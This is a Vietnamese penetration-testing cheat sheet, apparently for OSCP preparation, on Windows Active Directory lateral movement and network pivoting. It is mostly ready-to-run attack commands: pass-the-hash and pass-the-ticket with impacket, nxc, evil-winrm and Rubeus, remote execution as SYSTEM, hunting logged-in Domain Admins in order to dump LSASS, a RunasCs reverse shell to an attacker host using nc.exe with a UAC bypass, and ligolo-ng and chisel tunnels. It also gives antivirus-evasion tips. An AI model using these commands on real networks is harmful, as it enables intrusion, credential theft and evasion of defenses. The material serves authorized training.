# 07 — Lateral movement & Pivoting

Có credential/hash/ticket của một user → chạy lệnh trên máy mà user đó là admin,
và đi sâu vào mạng nội bộ.

---

## 1. Các kiểu "pass-the-X"

### 1.1. Pass-the-Hash (PtH) — dùng NT hash thay mật khẩu

**Giải thích:** NTLM dùng chính NT hash để xác thực, nên có hash là đủ, không cần
mật khẩu rõ. (Không áp dụng cho NetNTLMv2 bắt từ Responder — cái đó phải crack.)

```bash
nxc smb   $TARGET -u Administrator -H $HASH --local-auth       # local admin
nxc smb   $TARGET -u $USER -H $HASH                            # domain
nxc winrm $TARGET -u $USER -H $HASH
evil-winrm -i $TARGET -u $USER -H $HASH
impacket-psexec   $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-wmiexec  $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-smbexec  $DOMAIN/$USER@$TARGET -hashes :$HASH
xfreerdp /u:Administrator /pth:$HASH /v:$TARGET /cert:ignore   # cần Restricted Admin mode
```

### 1.2. Pass-the-Ticket (PtT) — dùng ticket Kerberos

```bash
# Có .ccache (từ impacket/certipy)
export KRB5CCNAME=/path/ticket.ccache
klist
impacket-psexec -k -no-pass $TARGET_FQDN
nxc smb $TARGET --use-kcache
evil-winrm -i $TARGET_FQDN -r CORP.LOCAL

# Chuyển .kirbi (Windows/Rubeus) ↔ .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

```powershell
PS> .\Rubeus.exe ptt /ticket:ticket.kirbi
PS> .\Rubeus.exe asktgt /user:u /rc4:$HASH /ptt         # overpass-the-hash
```

### 1.3. Overpass-the-Hash (hash → ticket)

NT hash (hoặc AES key) → xin TGT Kerberos → dùng cho các service chỉ nhận
Kerberos.

```bash
impacket-getTGT $DOMAIN/$USER -hashes :$HASH -dc-ip $DC         # → USER.ccache
export KRB5CCNAME=$USER.ccache
impacket-psexec -k -no-pass $TARGET_FQDN
```

---

## 2. Thực thi lệnh từ xa — chọn công cụ theo port/quyền

| Tool | Port/điều kiện | Ghi chú |
|------|----------------|---------|
| `evil-winrm` | 5985/5986, thuộc *Remote Management Users* hoặc admin | Shell ổn định, `upload`/`download`, `-s` nạp script |
| `impacket-psexec` | 445, admin | Tạo service → **SYSTEM**, dễ bị AV bắt |
| `impacket-smbexec` | 445, admin | Không tạo binary, kín hơn |
| `impacket-wmiexec` | 135+445, admin | Semi-interactive, ít log, **ưu tiên khi né AV** |
| `impacket-dcomexec` | 135, admin | Qua DCOM (MMC20/ShellWindows) |
| `impacket-atexec` | 445, admin | Scheduled task |
| `nxc ... -x / -X` | 445/5985 | Chạy lệnh nhanh: `nxc smb $T -u u -p p -x 'whoami'` |
| `xfreerdp` | 3389, *Remote Desktop Users* | GUI; `/drive:share,/tmp` để copy file |
| `RunasCs.exe` | trên máy, có credential khác | Khi không mở được WinRM/RDP |

```bash
# Ví dụ chạy lệnh/đẩy payload nhanh
nxc smb $TARGET -u $USER -p $PASS -x "whoami /all"
nxc smb $TARGET -u $USER -p $PASS -X '$PSVersionTable'          # PowerShell
xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$TARGET /cert:ignore /drive:kali,/home/kali/share /dynamic-resolution
```

```powershell
# Trên Windows, chạy với credential khác khi không có RDP/WinRM
PS> .\RunasCs.exe alice 'Password123!' "cmd /c C:\Users\Public\nc.exe LHOST 443 -e cmd" --bypass-uac
PS> $c = New-Object System.Management.Automation.PSCredential('CORP\alice',(ConvertTo-SecureString 'Password123!' -AsPlainText -Force))
PS> Invoke-Command -ComputerName FILE01 -Credential $c -ScriptBlock { whoami }
PS> Enter-PSSession -ComputerName FILE01 -Credential $c
```

**Reverse shell listener (Kali):** `rlwrap nc -lvnp 443`.

---

## 3. Tìm "đi đâu tiếp"

```bash
# User hiện tại là admin ở máy nào
nxc smb 10.10.10.0/24 -u $USER -p $PASS            # (Pwn3d!)
# Ai đang đăng nhập ở đâu (săn admin đang online để dump)
nxc smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users
```

```powershell
PS> Find-LocalAdminAccess                # PowerView
PS> Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
PS> Get-NetSession -ComputerName FILE01
```

Chiến thuật kinh điển: tìm máy mà **Domain Admin đang đăng nhập** và **bạn là
admin local** → dump LSASS máy đó → lấy credential/ticket DA.

---

## 4. Pivoting (vào mạng nội bộ không định tuyến)

Sau khi chiếm máy có 2 card mạng (ví dụ `10.10.x` và `172.16.x`), dùng nó làm
bàn đạp. **Ligolo-ng** là lựa chọn gọn nhất cho OSCP.

### 4.1. Ligolo-ng (khuyến nghị)

```bash
# --- Trên Kali ---
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                                   # lắng nghe :11601

# --- Trên máy pivot (Windows) ---
PS> .\agent.exe -connect LHOST:11601 -ignore-cert

# --- Quay lại Kali, trong giao diện ligolo ---
ligolo-ng » session                                 # chọn agent
[Agent] » ifconfig                                  # xem subnet bên trong
# Thêm route tới mạng nội bộ:
sudo ip route add 172.16.1.0/24 dev ligolo
ligolo-ng » start
# Giờ mọi tool trên Kali truy cập 172.16.1.0/24 trực tiếp (nxc, nmap, evil-winrm...)

# Mở port để nạn nhân reverse shell về Kali qua pivot (listener):
ligolo-ng » listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```

### 4.2. Chisel (SOCKS proxy — khi không dùng được tun)

```bash
# Kali (server)
./chisel server -p 8000 --reverse
# Máy pivot
PS> .\chisel.exe client LHOST:8000 R:1080:socks
# Kali: thêm vào /etc/proxychains4.conf →  socks5 127.0.0.1 1080
proxychains4 nxc smb 172.16.1.0/24 -u $USER -p $PASS
proxychains4 evil-winrm -i 172.16.1.10 -u $USER -p $PASS
```

> proxychains **không** chuyển được ICMP (ping) và một số scan; dùng `nmap -sT
> -Pn` qua proxychains, hoặc ưu tiên ligolo-ng để tránh giới hạn này.

### 4.3. SSH (nếu máy pivot là Linux hoặc có OpenSSH)

```bash
ssh -D 1080 user@pivot                 # dynamic SOCKS
ssh -L 8080:172.16.1.10:80 user@pivot  # local forward
ssh -R 1080 user@pivot                 # remote (pivot → Kali)
```

---

## 5. Mẹo khi lateral movement thất bại

- Hash local admin không vào máy khác → có thể bị **LAPS** (mỗi máy khác mật
  khẩu) hoặc **UAC remote restriction** cho local account (dùng tài khoản domain
  hoặc RID 500).
- WinRM báo `Unauthorized` dù đúng credential → user không thuộc *Remote
  Management Users*; thử SMB/psexec.
- Kerberos báo lỗi → phải dùng **tên FQDN**, `/etc/hosts`, `krb5.conf`, giờ đồng
  bộ (file 00). Dùng `-k` thay vì NTLM khi NTLM bị tắt.
- AV chặn psexec → dùng `wmiexec`/`smbexec`, hoặc `nxc --amsi-bypass`, hoặc chạy
  trong bộ nhớ.

## Checklist

- [ ] PtH/PtT/OtH với mọi credential/hash/ticket có được
- [ ] `nxc smb <range>` tìm nơi (Pwn3d!) + `--loggedon-users`
- [ ] Dump LSASS máy có DA đăng nhập
- [ ] Máy nhiều NIC → ligolo-ng/chisel pivot → quét mạng mới (lặp lại file 01+03)
